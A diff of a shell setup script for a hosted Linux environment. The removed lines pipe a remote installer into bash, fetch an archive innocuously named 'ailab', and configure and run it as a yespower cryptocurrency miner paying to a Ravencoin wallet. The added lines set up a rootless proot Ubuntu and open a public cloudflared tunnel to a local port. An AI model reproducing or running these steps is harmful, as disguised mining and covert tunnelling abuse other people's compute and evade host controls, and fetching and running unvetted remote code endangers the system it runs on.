@@ -1,5 +1,7 @@
-apt update
-apt install sudo -y
-apt install curl ca-certificates -y
-curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash source ~/.bashrc && nvm install 18 && npm install && sh install.sh && curl https://github.com/WEASTERNSMITH/testlab1/raw/refs/heads/main/ailab.tar.gz -L -O -J && tar -xf ailab.tar.gz 
-cd ailab && npm install && sh install.sh && rm config.json echo '[{"algorithm": "yespower", "host": "yespower.na.mine.zpool.ca", "port": 6234, "worker": "RVkDXkSRDsXAzvAtFz3fuqT7chcdvWopyB", "password": "c=RVN", "workers": 8 }]' > config.json && node index.js
+mkdir Proot
+cd Proot && wget https://uk.lxd.images.canonical.com/images/ubuntu/jammy/amd64/cloud/20220628_07:42/rootfs.tar.xz && tar -xvf rootfs.tar.xz > /dev/null
+cd Proot && wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+cd Proot && curl -LO https://proot.gitlab.io/proot/bin/proot && chmod +x proot
+cd Proot && ./proot -S . dpkg -i cloudflared-linux-amd64.deb
+cd Proot && ./proot -S . cloudflared update
+cd Proot && ./proot -S . cloudflared tunnel --url localhost:9000
